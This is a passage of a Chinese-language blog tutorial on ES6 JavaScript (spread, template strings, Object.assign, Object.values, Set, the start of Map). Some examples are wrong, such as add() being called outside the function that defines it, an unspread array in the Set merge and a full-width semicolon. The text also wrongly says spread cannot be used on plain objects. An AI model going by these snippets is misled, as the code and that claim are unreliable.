class="number">7</span>)); <span class="comment">// 输出 22</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">10</span>)); <span class="comment">// 输出 10</span></span><br></pre></td></tr></tbody></table></figure><p>在上面的示例中，我们定义了一个名为sum的函数，它使用rest参数来接收任意数量的参数。在函数体内部，我们使用for…of循环遍历numbers数组，并将所有数字相加得到总和。</p><p>使用rest参数可以方便地处理不确定数量的参数，而不需要在函数定义时指定具体的参数个数。这对于处理可变长度的参数列表非常有用，例如计算总和、平均值等。</p><h5 id="25-字符串的反引号"><a href="#25-字符串的反引号" class="headerlink" title="25.字符串的反引号"></a>25.字符串的反引号</h5><p>在JavaScript中，反引号（`）用于创建模板字符串。模板字符串是一种特殊的字符串，可以包含变量、表达式和换行符，并且可以跨行书写。</p><p>使用反引号创建模板字符串的语法如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">`string text`</span></span><br></pre></td></tr></tbody></table></figure><p>在模板字符串中，可以使用<code>${}</code>语法插入变量或表达式。例如：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">'Alice'</span>;</span><br><span class="line"><span class="keyword">const</span> age = <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> message = <span class="string">`My name is <span class="subst">${name}</span> and I am <span class="subst">${age}</span> years old.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">// 输出：My name is Alice and I am 25 years old.</span></span><br></pre></td></tr></tbody></table></figure><p>模板字符串还支持多行文本，可以直接在模板字符串中换行，而不需要使用转义字符。例如：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> multiline = <span class="string">`</span></span><br><span class="line"><span class="string">  This is a</span></span><br><span class="line"><span class="string">  multiline</span></span><br><span class="line"><span class="string">  string.</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(multiline);</span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">//   This is a</span></span><br><span class="line"><span class="comment">//   multiline</span></span><br><span class="line"><span class="comment">//   string.</span></span><br></pre></td></tr></tbody></table></figure><p>需要注意的是，模板字符串只能由反引号包围，不能使用单引号或双引号。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        hello world&lt;br/&gt;</span></span><br><span class="line"><span class="string">        hello world&lt;br/&gt;</span></span><br><span class="line"><span class="string">        hello world&lt;br/&gt;</span></span><br><span class="line"><span class="string">        hello world&lt;br/&gt;</span></span><br><span class="line"><span class="string">    `</span>);</span><br><span class="line">    <span class="keyword">let</span> name = <span class="string">"hello"</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`<span class="subst">${name}</span> world `</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="26-扩展运算符"><a href="#26-扩展运算符" class="headerlink" title="26.扩展运算符"></a>26.扩展运算符</h5><p>在JavaScript中，扩展运算符（spread operator）用三个连续的点（…）表示。它可以用于展开数组、对象和字符串。</p><ol><li>展开数组：可以使用扩展运算符将一个数组展开为多个独立的元素。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">const</span> arr2 = [...arr1, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2); <span class="comment">// 输出：[1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></tbody></table></figure><ol><li>展开对象：可以使用扩展运算符将一个对象展开为多个独立的属性。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj1 = { <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> };</span><br><span class="line"><span class="keyword">const</span> obj2 = { ...obj1, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span> };</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2); <span class="comment">// 输出：{ a: 1, b: 2, c: 3, d: 4 }</span></span><br></pre></td></tr></tbody></table></figure><ol><li>展开字符串：可以使用扩展运算符将一个字符串展开为单个字符的数组。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">const</span> chars = [...str];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(chars); <span class="comment">// 输出：['h', 'e', 'l', 'l', 'o']</span></span><br></pre></td></tr></tbody></table></figure><p>需要注意的是，扩展运算符只能用于可迭代对象（如数组和字符串），不能用于普通对象。另外，扩展运算符是浅拷贝，对于嵌套的对象或数组，只会复制引用，而不会复制其内部的值。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//扩展运算符</span></span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    arr.<span class="title function_">push</span>(...[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]); <span class="comment">//扩展了数组的内容</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>,...[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(...(<span class="number">1</span> &gt; <span class="number">0</span> ? [<span class="string">'a'</span>]: []));</span><br><span class="line">    <span class="comment">//用于函数调用</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">push</span>(<span class="params">array,...items</span>) {</span><br><span class="line">        {array.<span class="title function_">push</span>(...items);}</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x,y</span>) {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(x + y);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">const</span> numbers = [<span class="number">4</span>,<span class="number">38</span>];</span><br><span class="line">    <span class="title function_">add</span>(...numbers);<span class="comment">// 结果相加 将4和38分别分开为两个参数进行添加</span></span><br><span class="line">  <span class="keyword">let</span> arr3 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">let</span> arr4 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">let</span> arr5 = arr3.<span class="title function_">push</span>(...arr4);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr5);</span><br><span class="line">    <span class="comment">//复制数组</span></span><br><span class="line">    <span class="keyword">const</span> arr6 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">const</span> arr6_cy = [...arr6];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr6_cy);</span><br><span class="line">    <span class="comment">//合并数组</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>([...arr6,arr5,arr4]);</span><br><span class="line">    <span class="comment">//与结构赋值结合使用</span></span><br><span class="line">    <span class="keyword">const</span> [first,...rest] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(first); <span class="comment">//数组第一个</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(rest); <span class="comment">//剩余</span></span><br></pre></td></tr></tbody></table></figure><h5 id="27-类数组对象"><a href="#27-类数组对象" class="headerlink" title="27.类数组对象"></a>27.类数组对象</h5><p>类数组对象的属性必须要有length长度</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = {</span><br><span class="line">        <span class="number">0</span>:<span class="string">'tom'</span>,</span><br><span class="line">        <span class="number">1</span>:<span class="string">'18'</span>,</span><br><span class="line">        <span class="number">2</span>:[<span class="string">'jom,aimi'</span>],</span><br><span class="line">        <span class="attr">length</span>:<span class="number">3</span> <span class="comment">//关键点 必须要有长度 长度的长短决定输出的数组长度</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">let</span> like = <span class="title class_">Array</span>.<span class="title function_">from</span>(arrayLike);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(like);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(like);</span><br></pre></td></tr></tbody></table></figure><h5 id="28-对象遍历方法"><a href="#28-对象遍历方法" class="headerlink" title="28.对象遍历方法"></a>28.对象遍历方法</h5><p>在JavaScript中，有几种常用的方法可以用于遍历数组：<code>keys()</code>、<code>values()</code>和<code>entries()</code>。</p><ol><li><code>keys()</code>方法：<code>keys()</code>方法返回一个新的Array Iterator对象，该对象包含数组中每个索引的键（即索引值）。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">const</span> iterator = arr.<span class="title function_">keys</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> iterator) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key); <span class="comment">// 输出：0, 1, 2</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在上面的例子中，<code>keys()</code>方法返回一个迭代器对象，我们可以使用<code>for...of</code>循环来遍历迭代器对象并输出每个索引的键。</p><ol><li><code>values()</code>方法：<code>values()</code>方法返回一个新的Array Iterator对象，该对象包含数组中每个索引的值。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">const</span> iterator = arr.<span class="title function_">values</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> value <span class="keyword">of</span> iterator) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// 输出：'a', 'b', 'c'</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在上面的例子中，<code>values()</code>方法返回一个迭代器对象，我们可以使用<code>for...of</code>循环来遍历迭代器对象并输出每个索引的值。</p><ol><li><code>entries()</code>方法：<code>entries()</code>方法返回一个新的Array Iterator对象，该对象包含数组中每个索引的键值对。例如：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">const</span> iterator = arr.<span class="title function_">entries</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> iterator) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(entry); <span class="comment">// 输出：[0, 'a'], [1, 'b'], [2, 'c']</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在上面的例子中，<code>entries()</code>方法返回一个迭代器对象，我们可以使用<code>for...of</code>循环来遍历迭代器对象并输出每个索引的键值对。</p><p>需要注意的是，<code>keys()</code>、<code>values()</code>和<code>entries()</code>方法返回的是迭代器对象，我们可以使用<code>for...of</code>循环来遍历迭代器对象，或者使用<code>Array.from()</code>方法将迭代器对象转换为数组。这些方法在遍历数组时非常有用，可以根据需要选择使用哪种方法来获取键、值或键值对。</p><h5 id="29-字符串的操作方法"><a href="#29-字符串的操作方法" class="headerlink" title="29.字符串的操作方法"></a>29.字符串的操作方法</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="string">"hello world"</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"字符串操作方法:"</span> + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"字符串中是否存在字符'h':"</span> + text.<span class="title function_">includes</span>(<span class="string">'h'</span>) + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"参数字符是否在原字符串头部"</span> + text.<span class="title function_">startsWith</span>(<span class="string">' '</span>) + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"参数字符是否在原字符串尾部"</span> + text.<span class="title function_">endsWith</span>(<span class="string">'d'</span>) + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"返回一个字符串，将原字符串重复N次:"</span> + text.<span class="title function_">repeat</span>(<span class="number">10</span>) + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"头部补全:"</span> + text.<span class="title function_">padStart</span>(<span class="number">20</span>,<span class="string">'h'</span>) + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"尾部补全:"</span> + text.<span class="title function_">padEnd</span>(<span class="number">20</span>,<span class="string">'w'</span>) + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"消除字符串头部空格:"</span> + text.<span class="title function_">trimStart</span>() + <span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"消除字符串尾部空格:"</span> + text.<span class="title function_">trimEnd</span>() + <span class="string">"&lt;br/&gt;"</span>);</span><br></pre></td></tr></tbody></table></figure><h5 id="30-属性的简洁写法"><a href="#30-属性的简洁写法" class="headerlink" title="30.属性的简洁写法"></a>30.属性的简洁写法</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">"你好"</span>;</span><br><span class="line">   <span class="keyword">let</span> birth = <span class="string">"世界"</span>;</span><br><span class="line">   <span class="keyword">const</span> <span class="title class_">Person</span> = {</span><br><span class="line">       name,</span><br><span class="line">       birth,</span><br><span class="line">       <span class="title function_">etinfo</span>(<span class="params"></span>){</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`名字<span class="subst">${<span class="variable language_">this</span>.name}</span> 生日<span class="subst">${<span class="variable language_">this</span>.birth}</span>`</span>);</span><br><span class="line">       }</span><br><span class="line">   };</span><br><span class="line">   <span class="title class_">Person</span>.<span class="title function_">etinfo</span>();</span><br></pre></td></tr></tbody></table></figure><h5 id="31-对象新增方法比较方法-or-Object-is-的区别"><a href="#31-对象新增方法比较方法-or-Object-is-的区别" class="headerlink" title="31.对象新增方法比较方法 === or Object.is()的区别"></a>31.对象新增方法比较方法 === or Object.is()的区别</h5><p>在JavaScript中，NaN（Not a Number）是一个特殊的数值，表示不是有效的数字。NaN与任何其他值（包括NaN本身）进行比较时，结果都是false。这是因为NaN被认为是不可比较的。</p><p>在比较NaN时，使用”===”运算符会返回false，因为”===”运算符执行严格相等比较，要求两个操作数的类型和值都相等。而NaN与自身比较时，由于它是一个特殊的非数字值，所以返回false。</p><p>为了解决这个问题，<a href="http://es6引入了object.is/">ES6引入了Object.is</a>()方法。<a href="http://object.is/">Object.is</a>()方法执行的是同值相等比较，它会判断两个值是否是相同的值。当比较NaN时，<a href="http://object.is/">Object.is</a>(NaN, NaN)会返回true，因为它将NaN视为相同的值。</p><p>另外，对于+0和-0，它们在数值上是相等的，但在比较时，使用”===”运算符会返回true。这是因为”===”运算符执行严格相等比较，不会考虑数值的符号。<a href="http://而object.is/">而Object.is</a>(+0, -0)会返回false，因为它执行的是同值相等比较，会区分+0和-0。</p><p>总结起来，”===”运算符执行严格相等比较，不会将NaN视为相同的值，也不会区分+0和-0。<a href="http://而object.is/">而Object.is</a>()方法执行同值相等比较，将NaN视为相同的值，区分+0和-0。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span> === <span class="title class_">NaN</span>); <span class="comment">//=== 无法比较</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">NaN</span>,<span class="title class_">NaN</span>)); <span class="comment">//Object,is则可以</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(+<span class="number">0</span> === -<span class="number">0</span>);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">is</span>(+<span class="number">0</span>,-<span class="number">0</span>));</span><br></pre></td></tr></tbody></table></figure><h5 id="32-Object-assign"><a href="#32-Object-assign" class="headerlink" title="32.Object.assign()"></a>32.Object.assign()</h5><p>例子:</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> target1 = {<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">1</span>};</span><br><span class="line">  <span class="keyword">const</span> source3 = {<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:<span class="number">2</span>};</span><br><span class="line">  <span class="keyword">const</span> source4 = {<span class="attr">c</span>:<span class="number">3</span>};</span><br><span class="line">  <span class="keyword">let</span> a = <span class="title class_">Object</span>.<span class="title function_">assign</span>(target1,source3,source4);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br></pre></td></tr></tbody></table></figure><p>Object.assign()是JavaScript中的一个方法，用于将一个或多个源对象的属性复制到目标对象中。它可以用于对象的合并、属性的复制和覆盖等操作。</p><p>使用方式：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(target, ...sources)</span><br></pre></td></tr></tbody></table></figure><p>参数：</p><ul><li>target：目标对象，即要将属性复制到的对象。</li><li>sources：一个或多个源对象，即要从中复制属性的对象。</li></ul><p>返回值：</p><ul><li>返回目标对象，即复制属性后的对象。</li></ul><p>Object.assign()的特点：</p><ol><li>它将源对象的可枚举属性复制到目标对象中。</li><li>如果目标对象中已经存在相同的属性，则会覆盖目标对象中的属性。</li><li>它只会复制源对象自身的属性，不会复制继承的属性。</li><li>如果源对象中有多个相同的属性，则后面的属性会覆盖前面的属性。</li></ol><p>Object.assign()的应用场景：</p><ol><li>对象的合并：可以将多个对象合并成一个对象。</li><li>对象的复制：可以复制一个对象的属性到另一个对象中。</li><li>对象的属性覆盖：可以将一个对象的属性覆盖到另一个对象中。</li></ol><p>示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> target = { <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> };</span><br><span class="line"><span class="keyword">const</span> source = { <span class="attr">b</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">4</span> };</span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">Object</span>.<span class="title function_">assign</span>(target, source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// { a: 1, b: 3, c: 4 }</span></span><br></pre></td></tr></tbody></table></figure><p>在上面的示例中，我们将source对象的属性复制到target对象中。由于source对象中有一个相同的属性b，所以它会覆盖target对象中的属性b。最终的结果是target对象中的属性a、b和c分别为1、3和4。</p><p>总结： Object.assign()是一个用于将一个或多个源对象的属性复制到目标对象中的方法。它可以用于对象的合并、属性的复制和覆盖等操作。它的使用方式简单，可以方便地进行对象属性的复制和合并。</p><h5 id="33-Object-values"><a href="#33-Object-values" class="headerlink" title="33.Object.values()"></a>33.Object.values()</h5><p>Object.values()是JavaScript中的一个方法，用于返回一个给定对象自身的所有可枚举属性值的数组。</p><p>使用方式：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">javascript复制代码Object.values(obj)</span><br></pre></td></tr></tbody></table></figure><p>参数：</p><ul><li>obj：要返回属性值的对象。</li></ul><p>返回值：</p><ul><li>返回一个包含对象所有可枚举属性值的数组。</li></ul><p>Object.values()的特点：</p><ol><li>它返回的是一个数组，数组中的元素是对象的属性值。</li><li>返回的数组中的元素顺序与对象中属性的遍历顺序一致。</li><li>它只返回对象自身的可枚举属性值，不包括继承的属性值。</li></ol><p>Object.values()的应用场景：</p><ol><li>遍历对象的属性值：可以通过遍历返回的数组来获取对象的属性值。</li><li>将对象的属性值转换为数组：可以将对象的属性值转换为数组进行进一步的处理。</li></ol><p>示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = { <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span> };</span><br><span class="line"><span class="keyword">const</span> values = <span class="title class_">Object</span>.<span class="title function_">values</span>(obj);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(values); <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></tbody></table></figure><p>在上面的示例中，我们使用Object.values()方法获取了obj对象的所有属性值，并将其存储在一个数组中。最终的结果是一个包含属性值[1, 2, 3]的数组。</p><p>总结： Object.values()是一个用于返回一个对象自身的所有可枚举属性值的方法。它的使用方式简单，可以方便地获取对象的属性值并进行进一步的处理。它的返回值是一个数组，数组中的元素是对象的属性值。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = { <span class="number">1</span>: <span class="string">'a'</span>, <span class="number">2</span>: <span class="string">'b'</span>, <span class="number">3</span>: <span class="string">'c'</span> };</span><br><span class="line"><span class="keyword">const</span> values = <span class="title class_">Object</span>.<span class="title function_">values</span>(obj);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(values); <span class="comment">// ['a', 'b', 'c']</span></span><br></pre></td></tr></tbody></table></figure><p>在上面的示例中，我们使用Object.values()方法获取了obj对象的所有属性值，并将其存储在一个数组中。由于属性名为数值，Object.values()会将数值属性名转换为字符串，最终的结果是一个包含属性值[‘a’, ‘b’, ‘c’]的数组。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = { <span class="number">1</span>: <span class="string">'a'</span>, <span class="number">2</span>: <span class="string">'b'</span>, <span class="number">3</span>: <span class="string">'c'</span> };</span><br><span class="line"><span class="keyword">const</span> values = <span class="title class_">Object</span>.<span class="title function_">values</span>(obj[<span class="string">'2'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(values); <span class="comment">// ['b']</span></span><br></pre></td></tr></tbody></table></figure><p>在上面的示例中，我们使用Object.values()方法获取了obj对象中属性名为’2’的属性值，并将其存储在一个数组中。最终的结果是一个包含属性值[‘b’]的数组。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = { <span class="number">1</span>: <span class="string">'a'</span>, <span class="attr">true</span>: <span class="string">'b'</span>, <span class="number">3</span>: <span class="string">'c'</span> };</span><br><span class="line"><span class="keyword">const</span> values = <span class="title class_">Object</span>.<span class="title function_">values</span>(obj[<span class="literal">true</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(values); <span class="comment">// ['b']</span></span><br></pre></td></tr></tbody></table></figure><p>在上面的示例中，我们使用Object.values()方法获取了obj对象中属性名为true的属性值，并将其存储在一个数组中。最终的结果是一个包含属性值[‘b’]的数组。</p><h5 id="34-Set对象给数组去重"><a href="#34-Set对象给数组去重" class="headerlink" title="34.Set对象给数组去重"></a>34.Set对象给数组去重</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//单一数组去重</span></span><br><span class="line"><span class="keyword">let</span> set1 = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set1);</span><br><span class="line"><span class="comment">// 多数组合并去重</span></span><br><span class="line">  <span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">let</span> arr2 = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">let</span> set2 = <span class="keyword">new</span> <span class="title class_">Set</span>([...arr1,arr2]);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(set2);</span><br><span class="line">  <span class="comment">//字符串去重</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>([...<span class="keyword">new</span> <span class="title class_">Set</span>(<span class="string">'ababbc'</span>)].<span class="title function_">join</span>(<span class="string">''</span>));</span><br><span class="line">  <span class="comment">//Set函数接受数组作为参数</span></span><br><span class="line">  <span class="keyword">const</span> items = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>]);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(items.<span class="property">size</span>)；</span><br></pre></td></tr></tbody></table></figure><h5 id="35-Set对象的属性和方法"><a href="#35-Set对象的属性和方法" class="headerlink" title="35.Set对象的属性和方法"></a>35.Set对象的属性和方法</h5><p><code>Set</code>是JavaScript中的一种数据结构，它允许你存储任何类型的唯一值，无论是原始值还是对象引用。下面是<code>Set</code>的一些常用属性和方法的介绍：</p><p>属性：</p><ul><li><code>Set.prototype.size</code>：返回<code>Set</code>对象中的元素数量。</li></ul><p>方法：</p><ul><li><code>Set.prototype.add(value)</code>：向<code>Set</code>对象中添加一个新的元素。如果该元素已经存在，则不会重复添加。</li><li><code>Set.prototype.delete(value)</code>：从<code>Set</code>对象中删除指定的元素。</li><li><code>Set.prototype.has(value)</code>：判断<code>Set</code>对象中是否存在指定的元素。如果存在，则返回<code>true</code>；否则返回<code>false</code>。</li><li><code>Set.prototype.clear()</code>：清空<code>Set</code>对象中的所有元素。</li><li><code>Set.prototype.values()</code>：返回一个新的迭代器对象，该对象按插入顺序包含<code>Set</code>对象中的所有值。</li><li><code>Set.prototype.keys()</code>：与<code>values()</code>方法相同，返回一个新的迭代器对象，该对象按插入顺序包含<code>Set</code>对象中的所有值。</li><li><code>Set.prototype.entries()</code>：返回一个新的迭代器对象，该对象按插入顺序包含<code>Set</code>对象中的所有值的键值对。</li><li><code>Set.prototype.forEach(callbackFn[, thisArg])</code>：按插入顺序，为<code>Set</code>对象中的每个元素执行一次提供的回调函数。</li></ul><p>使用示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">1</span>);</span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">2</span>);</span><br><span class="line">set.<span class="title function_">add</span>(<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="property">size</span>); <span class="comment">// 输出: 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">has</span>(<span class="number">2</span>)); <span class="comment">// 输出: true</span></span><br><span class="line">set.<span class="title function_">delete</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">has</span>(<span class="number">2</span>)); <span class="comment">// 输出: false</span></span><br><span class="line">set.<span class="title function_">forEach</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">});</span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line">set.<span class="title function_">clear</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="property">size</span>); <span class="comment">// 输出: 0</span></span><br></pre></td></tr></tbody></table></figure><p>这些是<code>Set</code>的一些常用属性和方法，它们可以帮助你在JavaScript中处理唯一值的集合。</p><h5 id="36-Map数据结构的基本用法"><a href="#36-Map数据结构的基本用法" class="headerlink" title="36.Map数据结构的基本用法"></a>36.Map数据结构的基本用法</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//Map构造函数接受数组作为参数</span></span><br><span class="line">   <span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>([[<span 